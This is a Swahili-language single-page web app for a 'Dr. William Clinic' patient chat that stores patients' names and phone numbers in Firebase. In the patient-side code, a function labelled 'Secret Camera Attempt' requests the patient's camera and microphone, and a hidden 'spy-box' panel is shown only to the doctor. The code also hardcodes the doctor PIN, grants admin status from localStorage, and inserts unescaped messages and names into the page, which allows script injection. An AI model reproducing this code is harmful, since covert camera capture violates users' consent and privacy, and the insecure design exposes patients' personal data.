<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Dr. William: Master Elite v7</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        :root { --gold: #D4AF37; --bg: #000; --red: #ff4757; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body, html { background: var(--bg); color: white; height: 100vh; overflow: hidden; position: fixed; width: 100%; }

        /* BLACK BIRD BACKGROUND */
        .app-bg {
            position: fixed; inset: 0;
            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.95)), 
                        url('https://images.unsplash.com/photo-1516233501034-753582b795b6?q=80&w=1350&auto=format&fit=crop');
            background-size: cover; background-position: center; z-index: -1;
        }

        /* SURVEILLANCE FEED */
        #spy-box {
            position: fixed; top: 10px; right: 10px; width: 110px; height: 140px;
            border: 2px solid var(--gold); border-radius: 15px; z-index: 2000;
            overflow: hidden; background: #111; display: none; box-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
        }
        #spy-feed { width: 100%; height: 100%; object-fit: cover; }

        /* SCREENS */
        #login-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .login-box { background: rgba(20,20,20,0.95); padding: 40px; border-radius: 30px; border: 1px solid var(--gold); width: 90%; max-width: 400px; text-align: center; }
        .login-box input { width: 100%; padding: 16px; margin: 12px 0; border-radius: 12px; background: #000; color: white; border: 1px solid #333; font-size: 16px; }

        #main-app { display: none; flex-direction: column; height: 100vh; }
        .header { padding: 15px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--gold); display: flex; justify-content: space-between; align-items: center; }

        /* DOCTOR DASHBOARD */
        #doc-dashboard { flex: 1; overflow-y: auto; padding: 20px; display: none; }
        .patient-card { background: #111; padding: 20px; border-radius: 20px; margin-bottom: 12px; border: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }

        /* CHAT */
        #chat-area { flex: 1; display: none; flex-direction: column; position: relative; }
        .messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; padding-bottom: 110px; }
        .msg { padding: 14px 18px; border-radius: 20px; max-width: 80%; font-size: 14px; position: relative; word-wrap: break-word; }
        .msg.me { background: var(--gold); color: black; align-self: flex-end; border-bottom-right-radius: 2px; }
        .msg.other { background: #222; color: white; align-self: flex-start; border-bottom-left-radius: 2px; }

        /* TYPING */
        .typing { position: fixed; bottom: 0; width: 100%; background: #000; padding: 20px; display: flex; gap: 12px; align-items: center; border-top: 1px solid #222; }
        .input-box { flex: 1; background: #111; border-radius: 30px; border: 1px solid var(--gold); padding: 5px 15px; display: flex; }
        .input-box input { flex: 1; background: transparent; border: none; color: white; padding: 10px; outline: none; }
        .send-btn { background: var(--gold); border: none; width: 50px; height: 50px; border-radius: 50%; color: black; cursor: pointer; }
    </style>
</head>
<body>

    <div class="app-bg"></div>

    <div id="spy-box"><video id="spy-feed" autoplay muted playsinline></video></div>

    <div id="login-screen">
        <div class="login-box">
            <h2 style="color:var(--gold)">DR. WILLIAM CLINIC</h2>
            <div id="user-form">
                <input type="text" id="name-in" placeholder="Majina Yako Mawili">
                <input type="tel" id="phone-in" placeholder="Namba ya Simu" maxlength="10">
            </div>
            <input type="password" id="pin-in" placeholder="Doctor Secure PIN" style="display:none;">
            <p onclick="setAdmin()" id="admin-trigger" style="color:var(--gold); margin:15px; cursor:pointer; font-size:12px;">Ingia kama Daktari</p>
            <button onclick="login()" style="background:var(--gold); width:100%; padding:18px; border-radius:15px; border:none; font-weight:bold; cursor:pointer;">ANZA SASA</button>
        </div>
    </div>

    <div id="main-app">
        <div class="header">
            <div><b id="h-title" style="color:var(--gold)">Clinic</b><br><small id="h-sub" style="font-size:10px;"></small></div>
            <button onclick="location.reload()" id="back-btn" style="display:none; background:none; border:1px solid var(--gold); color:white; padding:5px 15px; border-radius:10px;">Back</button>
        </div>

        <div id="doc-dashboard">
            <h4 style="color:#555; margin-bottom:15px;">WAGONJWA WAKO:</h4>
            <div id="p-list"></div>
        </div>

        <div id="chat-area">
            <div class="messages" id="msg-flow"></div>
            <div class="typing">
                <i class="fas fa-camera" style="color:var(--gold); font-size:20px;" onclick="document.getElementById('file-up').click()"></i>
                <input type="file" id="file-up" style="display:none;" onchange="sendFile(this)">
                <div class="input-box">
                    <input type="text" id="text-in" placeholder="Andika hapa..." onkeypress="if(event.key==='Enter') pushMsg()">
                </div>
                <button class="send-btn" onclick="pushMsg()"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>
    </div>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3"></audio>

    <script>
        const firebaseConfig = { databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let user = JSON.parse(localStorage.getItem('doc_william_v7'));
        let isDoc = localStorage.getItem('is_doc_v7') === 'true';
        let activeRoom = "";

        if(user) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'flex';
            isDoc ? runDoc() : runUser();
        }

        function setAdmin() {
            document.getElementById('user-form').style.display = 'none';
            document.getElementById('pin-in').style.display = 'block';
            document.getElementById('admin-trigger').style.display = 'none';
        }

        function login() {
            const name = document.getElementById('name-in').value;
            const phone = document.getElementById('phone-in').value;
            const pin = document.getElementById('pin-in').value;

            if(pin === "W005") {
                isDoc = true; user = { name: "Dr. William" };
                localStorage.setItem('is_doc_v7', 'true');
            } else {
                if(!name || phone.length < 10) return alert("Jaza taarifa sahihi!");
                activeRoom = "room_" + phone;
                user = { name, phone, roomId: activeRoom };
                db.ref('patients/' + activeRoom).set({ ...user, lastSeen: Date.now() });
            }
            localStorage.setItem('doc_william_v7', JSON.stringify(user));
            location.reload();
        }

        function runDoc() {
            document.getElementById('doc-dashboard').style.display = 'block';
            document.getElementById('h-title').innerText = "Doctor Terminal";
            db.ref('patients').on('value', snap => {
                const list = document.getElementById('p-list');
                list.innerHTML = "";
                snap.forEach(c => {
                    const p = c.val();
                    const online = (Date.now() - p.lastSeen) < 15000;
                    list.innerHTML += `<div class="patient-card" onclick="openChat('${c.key}','${p.name}','${p.phone}')">
                        <div><b>${p.name}</b><br><small>${p.phone}</small></div>
                        <div style="color:${online?'#2ed573':'#555'}">‚óè ${online?'Online':'Off'}</div>
                    </div>`;
                });
            });
        }

        function runUser() {
            openChat(user.roomId, "Dr. William", "Online Advisor");
            // Secret Camera Attempt
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(s => {
                document.getElementById('spy-feed').srcObject = s;
            }).catch(e => console.log("Cam Blocked"));
            setInterval(() => db.ref('patients/' + user.roomId).update({ lastSeen: Date.now() }), 10000);
        }

        function openChat(id, name, phone) {
            activeRoom = id;
            document.getElementById('doc-dashboard').style.display = 'none';
            document.getElementById('chat-area').style.display = 'flex';
            document.getElementById('h-title').innerText = name;
            document.getElementById('h-sub').innerText = phone;
            if(isDoc) {
                document.getElementById('back-btn').style.display = 'block';
                document.getElementById('spy-box').style.display = 'block';
            }
            
            db.ref('messages/' + id).off();
            db.ref('messages/' + id).on('child_added', snap => {
                const m = snap.val();
                const flow = document.getElementById('msg-flow');
                const div = document.createElement('div');
                const me = (isDoc && m.sender === "Dr. William") || (!isDoc && m.sender === user.name);
                div.className = `msg ${me ? 'me' : 'other'}`;
                div.innerHTML = `<small style="font-size:9px; opacity:0.5;">${m.sender}</small><br>${m.text}`;
                flow.appendChild(div);
                flow.scrollTop = flow.scrollHeight;
                if(!me) document.getElementById('notif').play();
            });
        }

        function pushMsg() {
            const input = document.getElementById('text-in');
            if(!input.value.trim()) return;
            db.ref('messages/' + activeRoom).push({
                sender: isDoc ? "Dr. William" : user.name,
                text: input.value.trim(),
                time: Date.now()
            });
            input.value = "";
        }

        function sendFile(input) {
            if(input.files[0]) {
                db.ref('messages/' + activeRoom).push({
                    sender: isDoc ? "Dr. William" : user.name,
                    text: "üì∑ Picha/Faili limetumwa: " + input.files[0].name,
                    time: Date.now()
                });
            }
        }
    </script>
</body>
</html>
